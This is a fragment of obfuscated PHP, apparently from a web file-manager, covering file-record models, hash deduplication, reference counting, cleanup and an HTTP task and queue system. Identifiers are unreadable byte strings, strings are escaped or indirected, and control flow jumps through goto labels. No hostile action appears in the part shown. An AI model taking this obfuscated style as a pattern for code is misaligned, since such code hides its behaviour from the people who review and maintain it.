unset($cÍç…áãµ); goto Dº‘¿ºîºì; Eääãë·‡‚: $cïó£ø²Š‡ =& $_SERVER[úÉ·öƒÑì©]; $eí˜ç¡î³Ë = array_unique(array_to_keyvalue($EÁÃéÅé†, $cïó£ø²Š‡[33], $cïó£ø²Š‡[1738])); $eí˜ç¡î³Ë = array_remove_value($eí˜ç¡î³Ë, $cïó£ø²Š‡[191]); goto cÎ¤º‡¸Öù; cÎ¤º‡¸Öù: if (!$eí˜ç¡î³Ë) { return; } foreach ($EÁÃéÅé† as $cÍç…áãµ) { if (isset($cÍç…áãµ[$cïó£ø²Š‡[1741]])) { $eí˜ç¡î³Ë[] = $cÍç…áãµ[$cïó£ø²Š‡[1741]][$cïó£ø²Š‡[1738]]; } } $cåÃ‰¯Ç‚‚ = $this->metaList($eí˜ç¡î³Ë); goto fŞ“ß†ÃÍš; Dº‘¿ºîºì: } private function metaList($cË¿á˜ˆ’³) { goto D¡âôãÔÛ‚; EÆ²´é…½¤: $FÀÙÑßÄÈğ = Model($E¦¸™ƒ¢¨‚[1742])->where($CÔÈ¢ñŞŠã)->select(); $FÀÙÑßÄÈğ = array_to_keyvalue_group($FÀÙÑßÄÈğ, $E¦¸™ƒ¢¨‚[1738]); foreach ($FÀÙÑßÄÈğ as $eŠİ¹Ä”•Û => $BñĞ‡šç») { $D ½µíĞ = array(); foreach ($BñĞ‡šç» as $C«¸îø¬˜Ü) { $D ½µíĞ[$C«¸îø¬˜Ü[$E¦¸™ƒ¢¨‚[93]]] = $C«¸îø¬˜Ü[$E¦¸™ƒ¢¨‚[381]]; } $FÀÙÑßÄÈğ[$eŠİ¹Ä”•Û] = $D ½µíĞ; } goto E¿÷ˆäÏ¨®; E¿÷ˆäÏ¨®: return $FÀÙÑßÄÈğ ? $FÀÙÑßÄÈğ : array(); goto DŞÆÁºÄïà; D¡âôãÔÛ‚: $E¦¸™ƒ¢¨‚ =& $_SERVER[úÉ·öƒÑì©]; if (!$cË¿á˜ˆ’³) { return array(); } $CÔÈ¢ñŞŠã = array($E¦¸™ƒ¢¨‚[1738] => array($E¦¸™ƒ¢¨‚[7], $cË¿á˜ˆ’³)); goto EÆ²´é…½¤; DŞÆÁºÄïà: } } class FileContentModel extends ModelBase { protected $tableName = "\x69\157\137\x66\x69\154\145\x5f\143\x6f\x6e\164\x65\156\x74\163"; protected $dataAuto = array(array("\x63\162\145\x61\x74\x65\x54\x69\155\145", "\x74\151\155\145", "\x69\x6e\163\145\162\164", "\146\x75\156\x63\x74\151\157\156")); } class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\146\151\x6c\x65"; protected $tableMeta = array("\x74\141\x62\154\145\116\x61\x6d\145" => "\151\157\137\146\151\x6c\145\x5f\155\x65\x74\141", "\x6d\x65\164\x61\106\151\x65\154\144" => "\x66\151\x6c\145\x49\104"); public function fileInfo($EÍ¸¡·–•ê) { $CÍİØ‘Á¦ï =& $_SERVER[úÉ·öƒÑì©]; static $Aá´†ƒ‘ë = array(); if (!isset($Aá´†ƒ‘ë[$EÍ¸¡·–•ê])) { $C¿ŞâÉÅÍÒ = $CÍİØ‘Á¦ï[1743]; $d¦×ã”È„ˆ = Model($CÍİØ‘Á¦ï[459])->field($C¿ŞâÉÅÍÒ)->where(array($CÍİØ‘Á¦ï[457] => $EÍ¸¡·–•ê))->find(); $Aá´†ƒ‘ë[$EÍ¸¡·–•ê] = $d¦×ã”È„ˆ; } return $Aá´†ƒ‘ë[$EÍ¸¡·–•ê]; } public function addFileByContent($e£¸„å = '', $Fİ·ŠÏ¶’ = '') { goto fÁÌ‘‹Æ®Æ; c¸ƒÅ•ªì´: $F«í÷Ç›¾ = $aÚ³£öÃèÜ . $B±–¤‰§•¨[1745] . rand_string(16); file_put_contents($F«í÷Ç›¾, $e£¸„å); $dÔÊèÄÅ‹ƒ = $this->addFile($F«í÷Ç›¾, $Fİ·ŠÏ¶’, !0); goto B³Îñ÷Â×†; B³Îñ÷Â×†: if (file_exists($F«í÷Ç›¾)) { @unlink($F«í÷Ç›¾); } return $dÔÊèÄÅ‹ƒ; goto bÂŒ§Úá”´; fÁÌ‘‹Æ®Æ: $B±–¤‰§•¨ =& $_SERVER[úÉ·öƒÑì©]; $aÚ³£öÃèÜ = TEMP_PATH . $B±–¤‰§•¨[1744]; if (!is_dir($aÚ³£öÃèÜ)) { mk_dir($aÚ³£öÃèÜ); } goto c¸ƒÅ•ªì´; bÂŒ§Úá”´: } public function createFileName($Aùõ‹ƒ ‰Ğ, $e…ŞÚğÄÊÁ = false, $BÀŠ–‡¶±§ = false) { goto dŒç©·Ú…; dŒç©·Ú…: $F¸íÛìÚÕ’ =& $_SERVER[úÉ·öƒÑì©]; $BÀ‡¾ø°†– = IO::init($F¸íÛìÚÕ’[8]); $a‹Ä­ŒÀ†ö = $this->makeFilePath($Aùõ‹ƒ ‰Ğ, $BÀ‡¾ø°†–, $e…ŞÚğÄÊÁ, $BÀŠ–‡¶±§); goto A¯«›ºÛ; A¯«›ºÛ: $CÏïÇ¿‹Í = $BÀ‡¾ø°†–->pathFather($a‹Ä­ŒÀ†ö); static $AÜù·óìÉ© = false; $e¬ò´©Ÿ’Î = $F¸íÛìÚÕ’[1746] . md5($CÏïÇ¿‹Í); goto A©µ½ì·Ï; A©µ½ì·Ï: if (!$AÜù·óìÉ© && !Cache::get($e¬ò´©Ÿ’Î)) { $AÜù·óìÉ© = !0; $b–àÀ‰Ë§« = IO::mkdir($CÏïÇ¿‹Í); if (!IO::exist($b–àÀ‰Ë§« . $F¸íÛìÚÕ’[777])) { IO::mkfile($b–àÀ‰Ë§« . $F¸íÛìÚÕ’[777]); } Cache::set($e¬ò´©Ÿ’Î, 1, 3600 * 2); } return $a‹Ä­ŒÀ†ö; goto b”ÓÎ˜˜ˆ´; b”ÓÎ˜˜ˆ´: } public function makeFilePath($d½„¶—ù×, $C½ É·ÁÄ¡, $E»÷ØÃ¡å¿ = false, $CêÁ‰Àº»‘ = false) { goto b‡Í¨ì”Å­; D­™—ŸŒÀ: $F±®Æ­¸¢Œ = $fèÍÄ¦®–… . rand_string(5) . short_id(100); $d½„¶—ù× = str_replace($d„ª”¤Éë[8], $d„ª”¤Éë[71], KodIO::clear($d½„¶—ù×)); $F³¨¤ºŒ®­ = $C½ É·ÁÄ¡->ext($d½„¶—ù×); goto fÎ‘›ºöê; b‡Í¨ì”Å­: $d„ª”¤Éë =& $_SERVER[úÉ·öƒÑì©]; $EáªÓšŠŠƒ = Model($d„ª”¤Éë[746])->get($d„ª”¤Éë[1747]); $fèÍÄ¦®–… = KodIO::defaultIO() . date($d„ª”¤Éë[1748]); goto D­™—ŸŒÀ; fÎ‘›ºöê: if (!$d½„¶—ù×) { $EáªÓšŠŠƒ = $d„ª”¤Éë[1749]; } switch ($EáªÓšŠŠƒ) { case $d„ª”¤Éë[1750]: $F±®Æ­¸¢Œ = $F±®Æ­¸¢Œ . $d„ª”¤Éë[95] . $C½ É·ÁÄ¡->ext($d½„¶—ù×); if ($F³¨¤ºŒ®­ == $d„ª”¤Éë[1689]) { $F±®Æ­¸¢Œ .= $d„ª”¤Éë[1437]; } break; case $d„ª”¤Éë[1751]: goto D¬‚Á‡¾æ½; dİ«ôí³›: if (IO::isTypeObject($F±®Æ­¸¢Œ) && !IO::isUploadServer($F±®Æ­¸¢Œ)) { if (IO::exist($F±®Æ­¸¢Œ)) { return $F±®Æ­¸¢Œ; } $dÍÄ§ó‚Ÿ = IO::setContent($F±®Æ­¸¢Œ, $d„ª”¤Éë[33]); if (!$dÍÄ§ó‚Ÿ) { show_json($d„ª”¤Éë[1754], !1); } } CacheLock::unlock($eÍÉ¯°Ôªô); break; goto b‚•­°ºÚ; B¬Œ’ëï£: $fèÍÄ¦®–… = $d„ª”¤Éë[1131] . $F«ßõµ–ğ[$d„ª”¤Éë[402]] . $d„ª”¤Éë[411] . date($d„ª”¤Éë[1752]) . $BŒÙÖ±—¿Ä . $d„ª”¤Éë[8]; if ($F³¨¤ºŒ®­ == $d„ª”¤Éë[1689]) { $d½„¶—ù× .= $d„ª”¤Éë[1437]; } $eÍÉ¯°Ôªô = $d„ª”¤Éë[1753] . $fèÍÄ¦®–… . $d½„¶—ù×; goto bÜğ‹èÔ„µ; bÜğ‹èÔ„µ: CacheLock::lock($eÍÉ¯°Ôªô); $F±®Æ­¸¢Œ = $fèÍÄ¦®–… . $d½„¶—ù×; if (IO::exist($fèÍÄ¦®–… . $d½„¶—ù×)) { $fëÊŒçù¬ = substr($d½„¶—ù×, 0, strlen($d½„¶—ù×) - strlen($F³¨¤ºŒ®­)); $B¶ù‘¦ºÌ = $CêÁ‰Àº»‘ ? substr($CêÁ‰Àº»‘, 0, 5) : ($E»÷ØÃ¡å¿ ? substr($E»÷ØÃ¡å¿, 0, 5) : rand_string(5)); $F±®Æ­¸¢Œ = $fèÍÄ¦®–… . $fëÊŒçù¬ . $B¶ù‘¦ºÌ . $d„ª”¤Éë[95] . $F³¨¤ºŒ®­; } goto dİ«ôí³›; D¬‚Á‡¾æ½: $b¿Á¡×Ñ»° = Model($d„ª”¤Éë[746])->get($d„ª”¤Éë[747]); $BŒÙÖ±—¿Ä = substr(md5($d„ª”¤Éë[748] . $b¿Á¡×Ñ»° . date($d„ª”¤Éë[724])), 0, 8); $F«ßõµ–ğ = KodIO::defaultDriver(); goto B¬Œ’ëï£; b‚•­°ºÚ: case $d„ª”¤Éë[1749]: break; default: break; } return $F±®Æ­¸¢Œ; goto F Ì‘Ó¾ğ; F Ì‘Ó¾ğ: } public function addFileByRemote($fÅ³ÊãÛäĞ, $Dé¨“¢âŒ…, $FùÑõè‰… = array()) { goto F½ÍéØ±·; E¡¼§Ó½Å©: if ($A²ß¼Â×ÊÌ = $this->addFileCheckExist($d¦«ÛÄ— [$fè’Ğ´È‚Ú[171]], $d¦«ÛÄ— [$fè’Ğ´È‚Ú[170]], $d¦«ÛÄ— [$fè’Ğ´È‚Ú[78]])) { return $A²ß¼Â×ÊÌ; } return $this->addFileData($d¦«ÛÄ— ); goto FÜÒÀ´ìÊÊ; e°¹ˆì¨Œœ: $E‘¾–Áƒ‘ = IO::hashMd5($fÅ³ÊãÛäĞ, $Aâ¢áÕ®); $Eô°¾Åİí = KodIO::defaultDriver(); $d¦«ÛÄ—  = array($fè’Ğ´È‚Ú[557] => IO::size($fÅ³ÊãÛäĞ), $fè’Ğ´È‚Ú[1755] => 1, $fè’Ğ´È‚Ú[422] => $Dé¨“¢âŒ…, $fè’Ğ´È‚Ú[789] => $Eô°¾Åİí[$fè’Ğ´È‚Ú[402]], $fè’Ğ´È‚Ú[423] => $fÅ³ÊãÛäĞ, $fè’Ğ´È‚Ú[1756] => $FùÑõè‰…[$fè’Ğ´È‚Ú[171]] ? $FùÑõè‰…[$fè’Ğ´È‚Ú[171]] : IO::hashSimple($fÅ³ÊãÛäĞ), $fè’Ğ´È‚Ú[1757] => $E‘¾–Áƒ‘ ? $E‘¾–Áƒ‘ : $Aâ¢áÕ®); goto E¡¼§Ó½Å©; F½ÍéØ±·: $fè’Ğ´È‚Ú =& $_SERVER[úÉ·öƒÑì©]; if (!IO::exist($fÅ³ÊãÛäĞ)) { return !1; } $Aâ¢áÕ® = $FùÑõè‰…[$fè’Ğ´È‚Ú[170]] ? $FùÑõè‰…[$fè’Ğ´È‚Ú[170]] : $fè’Ğ´È‚Ú[33]; goto e°¹ˆì¨Œœ; FÜÒÀ´ìÊÊ: } private function addFileData($Béß‡®ø¦) { $b¶â•ñÄ…¹ =& $_SERVER[úÉ·öƒÑì©]; if (!$Béß‡®ø¦) { return !1; } $Béß‡®ø¦[$b¶â•ñÄ…¹[78]] = intval($Béß‡®ø¦[$b¶â•ñÄ…¹[78]]); if (!$Béß‡®ø¦[$b¶â•ñÄ…¹[78]] && strlen($Béß‡®ø¦[$b¶â•ñÄ…¹[171]]) > 32) { $Béß‡®ø¦[$b¶â•ñÄ…¹[78]] = intval(substr($Béß‡®ø¦[$b¶â•ñÄ…¹[171]], 32)); } $F¼¢‘Üİ¹˜ = $this->add($Béß‡®ø¦); return $this->find($F¼¢‘Üİ¹˜); } public function addFile($bƒÕŸÁé¢®, $B¾…Û·šì, $e›™£“ê‚Æ = false) { goto d—ÁÛ¡¸Æ·; F‚¼ˆ×îÑ¡: return $bŒÌÂªÀË²; goto f±ÖÀ¦ùÆÆ; d•Îˆ…´Ü…: $CÓÅñå‡Ş› = $_SERVER[úÉ·öƒÑì©][1758] . $EÏöÎÕ„§¥; CacheLock::lock($CÓÅñå‡Ş›); if ($d‚ÎÄ°â• = $this->addFileCheckExist($E–’ó„ó˜ª, $EÏöÎÕ„§¥, $dÁîµòµÁ¿)) { CacheLock::unlock($CÓÅñå‡Ş›); return $d‚ÎÄ°â•; } goto FÇ¿÷”¡; FÇ¿÷”¡: $fÇ®¬ô¨Ì = $this->addFileMake($bƒÕŸÁé¢®, $dÁîµòµÁ¿, $E–’ó„ó˜ª, $EÏöÎÕ„§¥, $B¾…Û·šì, $e›™£“ê‚Æ); $bŒÌÂªÀË² = $this->addFileData($fÇ®¬ô¨Ì); CacheLock::unlock($CÓÅñå‡Ş›); goto F‚¼ˆ×îÑ¡; d—ÁÛ¡¸Æ·: $E–’ó„ó˜ª = IO::hashSimple($bƒÕŸÁé¢®); $EÏöÎÕ„§¥ = IO::hashMd5($bƒÕŸÁé¢®); $dÁîµòµÁ¿ = IO::size($bƒÕŸÁé¢®); goto d•Îˆ…´Ü…; f±ÖÀ¦ùÆÆ: } public function addFileMake($Bã…™Ùñò, $B´§³ãªĞ†, $AÄù­ø¡¼, $CèµºŒÅàë, $E¦ğ»¦¿ˆŸ, $EÎ¯Ä¡åÚš) { goto Dé„ßŒç; Dé„ßŒç: $B¢ê»­‰ï‚ =& $_SERVER[úÉ·öƒÑì©]; $c„Œòó¨Í = $this->createFileName($E¦ğ»¦¿ˆŸ, $AÄù­ø¡¼, $CèµºŒÅàë); $c²ñç’·­á = get_path_father($c„Œòó¨Í); goto bÜ•Áº¾Ø; bÜ•Áº¾Ø: $FĞªç­› ¯ = get_path_this($c„Œòó¨Í); if ($EÎ¯Ä¡åÚš) { $aÅ¥îŠ‹ö = IO::move($Bã…™Ùñò, $c²ñç’·­á, !1, $FĞªç­› ¯); } else { $aÅ¥îŠ‹ö = IO::copy($Bã…™Ùñò, $c²ñç’·­á, !1, $FĞªç­› ¯); } if (!$aÅ¥îŠ‹ö) { return !1; } goto FÍÃ£è·Á; FÍÃ£è·Á: $dïŠÌ´„Öå = KodIO::defaultDriver(); $FµĞÇËîœÚ = array($B¢ê»­‰ï‚[557] => $B´§³ãªĞ†, $B¢ê»­‰ï‚[1755] => 1, $B¢ê»­‰ï‚[422] => $E¦ğ»¦¿ˆŸ, $B¢ê»­‰ï‚[789] => $dïŠÌ´„Öå[$B¢ê»­‰ï‚[402]], $B¢ê»­‰ï‚[423] => $c„Œòó¨Í, $B¢ê»­‰ï‚[1756] => $AÄù­ø¡¼, $B¢ê»­‰ï‚[1757] => $CèµºŒÅàë); return $FµĞÇËîœÚ; goto AÁàºÂÉ‰å; AÁàºÂÉ‰å: } public function addFileCheckExist($déÒáë†µğ, $E‹ÈÆ§óà, $cÆŸÌ²èä) { $DäÂï’ÉÅİ =& $_SERVER[úÉ·öƒÑì©]; $F¿çÌ¸ø¨Û = $this->findByHash($déÒáë†µğ, $E‹ÈÆ§óà); if (!$F¿çÌ¸ø¨Û) { return !1; } $A¼„œ®å = array($DäÂï’ÉÅİ[1755] => intval($F¿çÌ¸ø¨Û[$DäÂï’ÉÅİ[1759]]) + 1, $DäÂï’ÉÅİ[557] => $cÆŸÌ²èä); $this->where(array($DäÂï’ÉÅİ[457] => $F¿çÌ¸ø¨Û[$DäÂï’ÉÅİ[456]]))->save($A¼„œ®å); return $F¿çÌ¸ø¨Û; } public function remove($C´³õù‰„…) { $this->linkCountChange($C´³õù‰„…, !1); $this->clearEmpty(); return !0; } public function linkAdd($fÀˆ®É““ù) { $this->linkCountChange($fÀˆ®É““ù, !0); } public function linkCountChange($fŞ¥«¥×¼á, $f¹¾Ú›÷‰) { goto C½¾„©µÎ; C½¾„©µÎ: $aÛõ­àŠºõ =& $_SERVER[úÉ·öƒÑì©]; if (!$fŞ¥«¥×¼á) { return; } if (!is_array($fŞ¥«¥×¼á)) { $fŞ¥«¥×¼á = array($fŞ¥«¥×¼á); } goto dæƒ…Ğ¡‰; dæƒ…Ğ¡‰: $c¯ŒæÔ‰Ñ¿ = array(); foreach ($fŞ¥«¥×¼á as $C¡„‚»œÇó) { $eÎŸ‡¦„ï = $C¡„‚»œÇó . $aÛõ­àŠºõ[33]; if (!$c¯ŒæÔ‰Ñ¿[$eÎŸ‡¦„ï]) { $c¯ŒæÔ‰Ñ¿[$eÎŸ‡¦„ï] = 0; } $c¯ŒæÔ‰Ñ¿[$eÎŸ‡¦„ï]++; } $B‹…¦À‘ó¨ = array(); goto d¤ß³±Ê; d¤ß³±Ê: foreach ($c¯ŒæÔ‰Ñ¿ as $C¡„‚»œÇó => $e²µõµ•») { $eÎŸ‡¦„ï = $e²µõµ•» . $aÛõ­àŠºõ[33]; if (!$B‹…¦À‘ó¨[$eÎŸ‡¦„ï]) { $B‹…¦À‘ó¨[$eÎŸ‡¦„ï] = array(); } $B‹…¦À‘ó¨[$eÎŸ‡¦„ï][] = $C¡„‚»œÇó; } foreach ($B‹…¦À‘ó¨ as $e²µõµ•» => $dÄ›ËÛæÔŒ) { if (!$dÄ›ËÛæÔŒ) { continue; } $e²µõµ•» = $f¹¾Ú›÷‰ ? $e²µõµ•» : -intval($e²µõµ•»); $Eì¢Ëà˜âŒ = array($aÛõ­àŠºõ[456] => array($aÛõ­àŠºõ[7], $dÄ›ËÛæÔŒ)); if ($e²µõµ•» < 0) { $Eì¢Ëà˜âŒ[$aÛõ­àŠºõ[1759]] = array($aÛõ­àŠºõ[980], abs($e²µõµ•»)); } $this->where($Eì¢Ëà˜âŒ)->setAdd($aÛõ­àŠºõ[1759], $e²µõµ•»); } goto B¾ºòñà¨; B¾ºòñà¨: } public function findByHash($d¥Ñã£Ù³Å, $cñÇìôŠ·– = false) { $DæÙ¢“‰ =& $_SERVER[úÉ·öƒÑì©]; if (!$d¥Ñã£Ù³Å && !$cñÇìôŠ·–) { return !1; } $A×ç¤Ëá¹ = array($DæÙ¢“‰[1756] => $d¥Ñã£Ù³Å); if ($cñÇìôŠ·–) { $A×ç¤Ëá¹ = array($DæÙ¢“‰[1757] => $cñÇìôŠ·–); } return $this->order($DæÙ¢“‰[1760])->where($A×ç¤Ëá¹)->find(); } public function clearEmpty($D«»ÔŞ‹ğ‹ = 0) { goto e š¤èàœí; e š¤èàœí: $c—Â“Ö§Üà =& $_SERVER[úÉ·öƒÑì©]; $A½™±ŠàÛŞ = time() - 3600 * 24 * $D«»ÔŞ‹ğ‹; $b“Æ‰Û¿ã = $c—Â“Ö§Üà[1761] . $A½™±ŠàÛŞ; goto EÃì¬®¤×”; F½ÏãÆì§: foreach ($f¥•æÆë¥¹ as $eˆÜ ¥é” ) { $AÕ¦Ê¢’->update(1); $this->resetFile($eˆÜ ¥é” ); } $AÕ¦Ê¢’->end(); goto fÀ’Ó­—š†; EÃì¬®¤×”: $f¥•æÆë¥¹ = $this->where($b“Æ‰Û¿ã)->select(); if (!$f¥•æÆë¥¹) { return; } $AÕ¦Ê¢’ = new Task($c—Â“Ö§Üà[1762], $c—Â“Ö§Üà[33], count($f¥•æÆë¥¹)); goto F½ÏãÆì§; fÀ’Ó­—š†: } public function resetFile($b•‰±‘ä©™) { goto AÜĞÃ¦¾ƒˆ; FÀÊÉµöŞ: if ($b•‰±‘ä©™[$D‚‰„—ƒ“[1759]] != $CØğ‘çç×İ) { $this->where($bÉ¥·—ïÈæ)->save(array($D‚‰„—ƒ“[1755] => $CØğ‘çç×İ)); } goto A“¬±á¼Ü½; aİØ‹ºÈ: $eêÍ¶ìºö = Model($D‚‰„—ƒ“[1763])->where($bÉ¥·—ïÈæ)->count(); $CØğ‘çç×İ = intval($Bù´×¼) + intval($eêÍ¶ìºö); if ($CØğ‘çç×İ == 0) { IO::remove($b•‰±‘ä©™[$D‚‰„—ƒ“[76]]); Model($D‚‰„—ƒ“[1764])->delete($b•‰±‘ä©™[$D‚‰„—ƒ“[456]]); $this->where($bÉ¥·—ïÈæ)->delete(); $this->metaSet($b•‰±‘ä©™[$D‚‰„—ƒ“[456]], null, null); return; } goto FÀÊÉµöŞ; AÜĞÃ¦¾ƒˆ: $D‚‰„—ƒ“ =& $_SERVER[úÉ·öƒÑì©]; $bÉ¥·—ïÈæ = array($D‚‰„—ƒ“[457] => $b•‰±‘ä©™[$D‚‰„—ƒ“[456]]); $Bù´×¼ = Model($D‚‰„—ƒ“[1213])->where($bÉ¥·—ïÈæ)->count(); goto aİØ‹ºÈ; A“¬±á¼Ü½: } public function storageInfo($dÅ‚Ş¬·Ë¥ = false) { goto aö¤Òòš‡; aö¤Òòš‡: $Fîİ¬Ô ’Ÿ =& $_SERVER[úÉ·öƒÑì©]; $Bù¢ã¡Á§¾ = $this->count() + 0.0; $fÈŞÏ›ô’ = 0; goto bÈØµçËƒ°; añ§Ú¬ãö¬: for ($E©¢ãáÇÃ = 0; $E©¢ãáÇÃ < $Bù¢ã¡Á§¾; $E©¢ãáÇÃ = $E©¢ãáÇÃ + $fµËœ§“‹) { $fĞ¦ò©“–º = $this->limit($E©¢ãáÇÃ, $E©¢ãáÇÃ + $fµËœ§“‹)->select(); foreach ($fĞ¦ò©“–º as $döŸ´ˆ”Üé) { $Aïƒ°Úã += $döŸ´ˆ”Üé[$Fîİ¬Ô ’Ÿ[78]] * $döŸ´ˆ”Üé[$Fîİ¬Ô ’Ÿ[1759]]; $fÈŞÏ›ô’ += $döŸ´ˆ”Üé[$Fîİ¬Ô ’Ÿ[78]] * ($döŸ´ˆ”Üé[$Fîİ¬Ô ’Ÿ[1759]] - 1); $CõÚù¨Ü¨‡ += $döŸ´ˆ”Üé[$Fîİ¬Ô ’Ÿ[1759]]; } } $döÄ†ÈĞË´ = array($Fîİ¬Ô ’Ÿ[1765] => $Aïƒ°Úã, $Fîİ¬Ô ’Ÿ[1766] => $fÈŞÏ›ô’, $Fîİ¬Ô ’Ÿ[1767] => $fÈŞÏ›ô’ / $Aïƒ°Úã, $Fîİ¬Ô ’Ÿ[82] => $Bù¢ã¡Á§¾, $Fîİ¬Ô ’Ÿ[1768] => $CõÚù¨Ü¨‡); return $döÄ†ÈĞË´; goto c§ö½ãÀõ‰; bÈØµçËƒ°: $Aïƒ°Úã = 1; $CõÚù¨Ü¨‡ = 0; $fµËœ§“‹ = 5000; goto añ§Ú¬ãö¬; c§ö½ãÀõ‰: } } goto d¿œŸÚÀ¹å; bÊÁ›â³¶Ó: class TaskHttp extends Task { protected function startAfter() { $e†’Ö²Éë =& $_SERVER[úÉ·öƒÑì©]; $cÇ†êø„éù =& $this->task; $cÇ†êø„éù[$e†’Ö²Éë[1599]] = 1; Hook::bind($e†’Ö²Éë[1571], array($this, $e†’Ö²Éë[1600])); Hook::bind($e†’Ö²Éë[1573], array($this, $e†’Ö²Éë[1601])); Hook::bind($e†’Ö²Éë[1575], array($this, $e†’Ö²Éë[1602])); } protected function endAfter() { $cÆ¹¦³ô˜‚ =& $_SERVER[úÉ·öƒÑì©]; Hook::unbind($cÆ¹¦³ô˜‚[1571], array($this, $cÆ¹¦³ô˜‚[1600])); Hook::unbind($cÆ¹¦³ô˜‚[1573], array($this, $cÆ¹¦³ô˜‚[1601])); Hook::unbind($cÆ¹¦³ô˜‚[1575], array($this, $cÆ¹¦³ô˜‚[1602])); } public function progressStart($b³«ŒÌŸÇ) { $bÚè¬Ş’¤­ =& $_SERVER[úÉ·öƒÑì©]; $fÛ«îíÔÎ = curl_getinfo($b³«ŒÌŸÇ); self::log($bÚè¬Ş’¤­[1603] . $fÛ«îíÔÎ[$bÚè¬Ş’¤­[314]]); self::valueSet($this->task[$bÚè¬Ş’¤­[402]], $this->task); } public function progressEnd($E„Šš­™¯Ö) { $d‹áà“Õá¤ =& $_SERVER[úÉ·öƒÑì©]; self::log($d‹áà“Õá¤[1604] . $this->task[$d‹áà“Õá¤[402]]); $this->end(); } public function progress($dš°†Ç‚‡À, $Câ™œÓØîÉ, $d¹¢ÅŒ ¶, $e²æ–¿†Û, $A¶¢’Õ×÷) { $EëÁÀ¤ù‰ =& $_SERVER[úÉ·öƒÑì©]; $d¦ĞÄ‹³ÛÉ =& $this->task; if ($A¶¢’Õ×÷ > 0) { $d¦ĞÄ‹³ÛÉ[$EëÁÀ¤ù‰[1029]] = $d¦ĞÄ‹³ÛÉ[$EëÁÀ¤ù‰[1029]] == 0 ? $e²æ–¿†Û : $d¦ĞÄ‹³ÛÉ[$EëÁÀ¤ù‰[1029]]; $d¦ĞÄ‹³ÛÉ[$EëÁÀ¤ù‰[1044]] = $A¶¢’Õ×÷; } else { if ($d¹¢ÅŒ ¶ > 0) { $d¦ĞÄ‹³ÛÉ[$EëÁÀ¤ù‰[1029]] = $d¦ĞÄ‹³ÛÉ[$EëÁÀ¤ù‰[1029]] == 0 ? $Câ™œÓØîÉ : $d¦ĞÄ‹³ÛÉ[$EëÁÀ¤ù‰[1029]]; $d¦ĞÄ‹³ÛÉ[$EëÁÀ¤ù‰[1044]] = $d¹¢ÅŒ ¶; } } $this->update(); self::log("\x70\x72\x6f\147\x72\145\163\x73\110\x74\164\x70\x3a\144\157\x77\156\x3a{$d¹¢ÅŒ ¶}\x2f{$Câ™œÓØîÉ}\73\40\x75\160\x6c\157\x61\x64\x3a{$A¶¢’Õ×÷}\57{$e²æ–¿†Û}\73"); } } class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\164\141\x73\153\x51\165\145\165\145\114\x65\x6e\147\x74\150"; const QUEUE_DATA = "\x74\x61\163\x6b\x51\x75\x65\165\145\104\x61\x74\x61"; public static $listData = false; public static function initTask() { } public static function add($eÊç•º­, $fØÇ†Ó‡ = array(), $eŠ‘§êÒ°ñ = '', $a”¢«õãÔË = '') { $FÕôè‡ µš =& $_SERVER[úÉ·öƒÑì©]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($a”¢«õãÔË && array_find_by_field(self::$listData, $FÕôè‡ µš[93], $a”¢«õãÔË)) { return !0; } self::$listData[] = array($FÕôè‡ µš[271] => $eÊç•º­, $FÕôè‡ µš[1605] => $fØÇ†Ó‡, $FÕôè‡ µš[440] => $eŠ‘§êÒ°ñ, $FÕôè‡ µš[93] => $a”¢«õãÔË); return !0; } public static function addSubmit() { $e¹ì†­ËÏğ =& $_SERVER[úÉ·öƒÑì©]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($e¹ì†­ËÏğ[1606] . json_encode_force(array_to_keyvalue(self::$listData, $e¹ì†­ËÏğ[33], $e¹ì†­ËÏğ[440])), $e¹ì†­ËÏğ[1607]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($bÓ¿ñãÓó, $a‰ªÁæ’ß£ = array(), $F±¬¹Ñº½á = '', $a‚µó¤ù = '') { goto FŒ’İ‘èÅ; c‹İ·‘àç: if ($a‚µó¤ù && array_find_by_field($c‚ÀƒéÖë, $E†£¡“ø¬æ[93], $a‚µó¤ù)) { return !0; } $c‚ÀƒéÖë[] = array($E†£¡“ø¬æ[271] => $bÓ¿ñãÓó, $E†£¡“ø¬æ[1605] => $a‰ªÁæ’ß£, $E†£¡“ø¬æ[440] => $F±¬¹Ñº½á, $E†£¡“ø¬æ[93] => $a‚µó¤ù); write_log($E†£¡“ø¬æ[1606] . $F±¬¹Ñº½á, $E†£¡“ø¬æ[1607]); goto a½±Ï«È»; a½±Ï«È»: self::setAll($c‚ÀƒéÖë); return !0; goto A½Ì™Úî; FŒ’İ‘èÅ: $E†£¡“ø¬æ =& $_SERVER[úÉ·öƒÑì©]; if (self::count() >= self::MAX_LENGTH) { return !1; } $c‚ÀƒéÖë = self::getAll(); goto c‹İ·‘àç; A½Ì™Úî: } public static function run() { goto C¡¡Ñ÷ñØ¨; CÁæÅ›÷‡í: return !0; goto A²Œ ï­; C¡¡Ñ÷ñØ¨: $EÛÃˆ•Õİµ =& $_SERVER[úÉ·öƒÑì©]; $eÉ¢…ƒ‰“µ = self::getAll(); $c”Â¸ÖíŸå = array_shift($eÉ¢…ƒ‰“µ); goto Fù¿ ‰óÑ´; Fù¿ ‰óÑ´: if (!$c”Â¸ÖíŸå) { return !1; } self::setAll($eÉ¢…ƒ‰“µ); $d”—ğÍ – = timeFloat(); goto DòÜÚ‘µ¥; DòÜÚ‘µ¥: try { Hook::apply($c”Â¸ÖíŸå[$EÛÃˆ•Õİµ[271]], $c”Â¸ÖíŸå[$EÛÃˆ•Õİµ[1605]]); } catch (Exception $aé¢«ëŒ) { } $D®÷ñã×ÌŞ = number_format(timeFloat() - $d”—ğÍ –, 3) . $EÛÃˆ•Õİµ[1548]; write_log($EÛÃˆ•Õİµ[1608] . $c”Â¸ÖíŸå[$EÛÃˆ•Õİµ[440]] . $EÛÃˆ•Õİµ[1609] . $D®÷ñã×ÌŞ, $EÛÃˆ•Õİµ[1607]); goto CÁæÅ›÷‡í; A²Œ ï­: } public static function count() { $f”‹›¥…Š = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$f”‹›¥…Š) { return 0; } return intval($f”‹›¥…Š); } public static function getAll() { $BÔ¤¼…ñó = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$BÔ¤¼…ñó) { return array(); } return $BÔ¤¼…ñó; } public static function 